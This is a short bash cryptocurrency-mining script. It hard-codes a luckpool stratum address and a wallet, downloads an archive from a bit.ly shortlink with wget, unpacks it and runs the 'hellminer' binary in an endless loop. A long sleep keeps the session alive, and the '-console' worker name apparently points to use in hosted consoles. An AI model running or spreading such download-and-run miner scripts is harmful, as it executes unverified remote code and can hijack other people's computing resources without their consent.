#!/bin/bash
POOL=stratum+tcp://ap.luckpool.net:3956#xnsub
WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
WORKER=$(echo $(shuf -i 10-40 -n 1)-console)
wget https://bit.ly/helminr
tar xf helminr
while [ 1 ]; do
./hellminer -c $POOL -u $WALLET.$WORKER -p x --cpu 2 
sleep 5
done
sleep 999999999 
